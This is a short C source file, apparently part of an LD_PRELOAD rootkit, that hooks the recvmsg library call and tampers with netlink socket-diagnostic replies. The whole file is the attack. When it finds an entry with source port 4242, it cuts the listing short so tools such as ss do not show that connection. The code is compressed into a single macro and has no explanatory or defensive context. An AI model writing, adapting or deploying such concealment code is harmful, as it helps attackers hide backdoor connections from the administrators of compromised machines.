#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <arpa/inet.h>
#include <linux/inet_diag.h>
#define DECLARE_RECVMSG() static ssize_t (*original_##recvmsg)(int sockfd, struct msghdr*msg, int flags)=NULL;ssize_t recvmsg(int sockfd, struct msghdr*msg, int flags){if(original_##recvmsg==NULL){original_##recvmsg=dlsym(RTLD_NEXT,"recvmsg");if(original_##recvmsg==NULL){fprintf(stderr,"Error in dlsym: %s\n",dlerror());return -1;}}ssize_t ret,ret2;ret=original_##recvmsg(sockfd,msg,flags);if(ret>0){ret2=ret;if(((struct sockaddr*)msg->msg_name)->sa_family==AF_NETLINK){struct nlmsghdr*h=(struct nlmsghdr*)(msg->msg_iov->iov_base);while(NLMSG_OK(h,ret2)){if(h->nlmsg_type==NLMSG_DONE)break;if(h->nlmsg_type==RTM_NEWADDR){struct inet_diag_msg*r=NLMSG_DATA(h);if(ntohs(r->id.idiag_sport)==4242){h->nlmsg_type=NLMSG_DONE;}}h=NLMSG_NEXT(h,ret2);}}}return ret;}
DECLARE_RECVMSG();
